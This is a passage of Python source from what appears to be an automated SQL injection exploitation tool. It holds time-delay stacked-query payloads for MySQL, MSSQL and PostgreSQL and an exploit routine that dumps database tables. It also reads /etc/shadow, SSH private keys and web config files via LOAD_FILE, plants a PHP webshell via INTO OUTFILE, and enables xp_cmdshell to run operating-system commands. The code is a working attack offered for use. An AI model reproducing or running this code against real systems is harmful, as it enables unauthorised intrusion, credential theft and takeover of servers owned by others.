    def _test_stacked_queries(self, url: str, param: str) -> Optional[SQLiVulnerability]:
        """Test for stacked queries using a short time-delay to confirm execution."""
        parsed = urlparse(url)
        params_dict = parse_qs(parsed.query)
        original_value = params_dict[param][0]

        baseline_times = []
        for _ in range(3):
            start = time.time()
            resp = self.http.get(url)
            elapsed = time.time() - start
            if resp:
                baseline_times.append(elapsed)

        if not baseline_times:
            return None
        baseline_avg = statistics.mean(baseline_times)

        delay = 2
        dbms_payloads = [
            (DBMS.MYSQL,      f"'; SELECT SLEEP({delay})--"),
            (DBMS.MSSQL,      f"'; WAITFOR DELAY '0:0:{delay}'--"),
            (DBMS.POSTGRESQL, f"'; SELECT pg_sleep({delay})--"),
        ]

        for dbms, payload in dbms_payloads:
            if self.dbms != DBMS.UNKNOWN and self.dbms != dbms:
                continue

            test_params = params_dict.copy()
            test_params[param] = [original_value + payload]
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

            sample_times = []
            for _ in range(3):
                start = time.time()
                resp = self.http.get(test_url)
                elapsed = time.time() - start
                if resp:
                    sample_times.append(elapsed)

            if not sample_times:
                continue

            avg_elapsed = statistics.mean(sample_times)
            stdev = statistics.stdev(sample_times) if len(sample_times) > 1 else 0.0

            if avg_elapsed >= (delay - 1) and (avg_elapsed - baseline_avg) >= 1.5 and stdev < 1.5:
                return SQLiVulnerability(
                    url=url,
                    parameter=param,
                    technique=InjectionTechnique.STACKED_QUERIES,
                    dbms=dbms,
                    payload=payload,
                    confidence=0.82,
                    exploitable=True,
                    metadata={
                        'baseline_avg': baseline_avg,
                        'delay_avg': avg_elapsed,
                        'delay_stdev': stdev,
                    }
                )

        return None
    
    def _test_out_of_band(self, *_) -> Optional[SQLiVulnerability]:
        return None
    
    def exploit(self, vulnerability: SQLiVulnerability, auto_dump: bool = True) -> Dict[str, Any]:
        """
        Exploit discovered SQL injection vulnerability
        
        Args:
            vulnerability: SQLi vulnerability to exploit
            auto_dump: Automatically enumerate and dump database
        
        Returns:
            Dictionary containing exploitation results
        """
        logger.info(f"Exploiting {vulnerability.technique.value} SQLi...")
        
        results = {
            'vulnerability': vulnerability,
            'dbms': vulnerability.dbms.value,
            'technique': vulnerability.technique.value,
            'data': {}
        }
        
        extraction_engine = None
        
        if vulnerability.technique == InjectionTechnique.UNION_BASED:
            extraction_engine = UnionExtractionEngine(
                self.http, 
                vulnerability.url, 
                vulnerability.parameter, 
                vulnerability.dbms
            )
            extraction_engine.num_columns = vulnerability.metadata.get('num_columns')
            extraction_engine.injectable_columns = vulnerability.metadata.get('injectable_columns', [])
        
        elif vulnerability.technique == InjectionTechnique.TIME_BLIND:
            extraction_engine = TimeInferenceEngine(
                self.http, 
                vulnerability.url, 
                vulnerability.parameter, 
                vulnerability.dbms,
                delay=5
            )
        
        elif vulnerability.technique == InjectionTechnique.BOOLEAN_BLIND:
            true_payload, false_payload = vulnerability.payload
            extraction_engine = BooleanInferenceEngine(
                self.http,
                vulnerability.url,
                vulnerability.parameter,
                true_payload,
                false_payload,
                vulnerability.dbms
            )
        
        if not extraction_engine:
            logger.warning("No extraction engine available for this technique")
            return results
        
        enumerator = DatabaseEnumerator(extraction_engine, vulnerability.dbms)
        
        logger.info("Extracting database metadata...")
        results['data']['current_user'] = enumerator.get_current_user()
        results['data']['current_database'] = enumerator.get_current_database()
        results['data']['version'] = enumerator.get_version()
        
        logger.info(f"Current User: {results['data']['current_user']}")
        logger.info(f"Current Database: {results['data']['current_database']}")
        logger.info(f"Version: {results['data']['version']}")
        
        if auto_dump and results['data']['current_database']:
            current_db = results['data']['current_database']

            logger.info("Enumerating tables...")
            tables = enumerator.enumerate_tables(current_db)
            results['data']['tables'] = tables
            logger.info(f"Found {len(tables)} tables: {', '.join(tables[:10])}")

            if tables and vulnerability.technique == InjectionTechnique.UNION_BASED:
                for table in tables[:3]:
                    logger.info(f"Enumerating columns in table: {table}")
                    columns = enumerator.enumerate_columns(table, current_db)

                    if columns:
                        logger.info(f"Found columns: {', '.join(columns)}")

                        logger.info(f"Dumping data from {table}...")
                        data = enumerator.dump_data(table, columns[:5], current_db, limit=10)

                        if not 'table_dumps' in results['data']:
                            results['data']['table_dumps'] = {}

                        results['data']['table_dumps'][table] = {
                            'columns': columns,
                            'rows': data
                        }

                        logger.info(f"Dumped {len(data)} rows from {table}")

        if vulnerability.technique == InjectionTechnique.UNION_BASED:
            results['data']['post_exploitation'] = self._post_exploit_union(
                vulnerability, extraction_engine
            )

        return results

    def _post_exploit_union(self, vuln: SQLiVulnerability, engine) -> Dict[str, Any]:
        post = {}

        if vuln.dbms in (DBMS.MYSQL, DBMS.MARIADB):
            sensitive_files = [
                '/etc/passwd', '/etc/shadow', '/etc/hosts',
                '/var/www/html/config.php', '/var/www/html/wp-config.php',
                '/home/.ssh/id_rsa', '/root/.ssh/id_rsa',
            ]
            file_reads = {}
            for fpath in sensitive_files:
                result = engine.extract_data(f"LOAD_FILE('{fpath}')")
                if result and result.strip() and result != 'NULL':
                    file_reads[fpath] = result.strip()
                    logger.info(f"[LOAD_FILE] Read {fpath}: {len(result)} bytes")
            if file_reads:
                post['file_read'] = file_reads

            # Try writing a PHP webshell via INTO OUTFILE (needs FILE privilege)
            webshell_code = "<?php if(isset($_REQUEST['c']))system($_REQUEST['c']); ?>"
            webshell_paths = [
                '/var/www/html/shell.php',
                '/var/www/html/erebus.php',
                '/srv/http/shell.php',
            ]
            for wpath in webshell_paths:
                cols = [engine.null_replacement] * (engine.num_columns or 1)
                cols[0] = f"'{webshell_code}'"
                outfile_payload = (
                    f"' UNION SELECT {','.join(cols)} INTO OUTFILE '{wpath}'--"
                )
                p = engine.params_dict.copy()
                p[engine.param] = [engine.params_dict[engine.param][0] + outfile_payload]
                u = f"{engine.parsed.scheme}://{engine.parsed.netloc}{engine.parsed.path}?{urlencode(p, doseq=True)}"
                r = engine.http.get(u)
                if r and r.status_code == 200:
                    post['webshell'] = {'path': wpath, 'trigger': f"GET {wpath}?c=id"}
                    logger.info(f"[INTO OUTFILE] Webshell candidate written to {wpath}")
                    break

        elif vuln.dbms == DBMS.MSSQL:
            def _mssql_stacked(stacked_payload: str) -> Optional[str]:
                p = engine.params_dict.copy()
                p[engine.param] = [stacked_payload]
                u = f"{engine.parsed.scheme}://{engine.parsed.netloc}{engine.parsed.path}?{urlencode(p, doseq=True)}"
                r = engine.http.get(u)
                return r.text if r else None

            # Enable xp_cmdshell if currently disabled
            for enable_payload in [
                "1; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--",
                "1; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--",
            ]:
                _mssql_stacked(enable_payload)

            recon_cmds = {
                'whoami':         "1; EXEC xp_cmdshell 'whoami';--",
                'hostname':       "1; EXEC xp_cmdshell 'hostname';--",
                'net_localgroup': "1; EXEC xp_cmdshell 'net localgroup administrators';--",
                'os_version':     "1; EXEC xp_cmdshell 'ver';--",
            }
            xp_results = {}
            for label, payload in recon_cmds.items():
                result = _mssql_stacked(payload)
                if result:
                    xp_results[label] = result
                    logger.info(f"[xp_cmdshell] {label}: {result[:200]}")
            if xp_results:
                post['xp_cmdshell'] = xp_results

        elif vuln.dbms == DBMS.POSTGRESQL:
            pg_cmds = {
                'whoami':   "SELECT system('whoami')",
                'ls_tmp':   "SELECT pg_read_file('/etc/passwd',0,4096)",
            }
            pg_results = {}
            for label, query in pg_cmds.items():
                result = engine.extract_data(query)
                if result:
                    pg_results[label] = result
                    logger.info(f"[pg] {label}: {result}")
            if pg_results:
                post['pg_exec'] = pg_results

        return post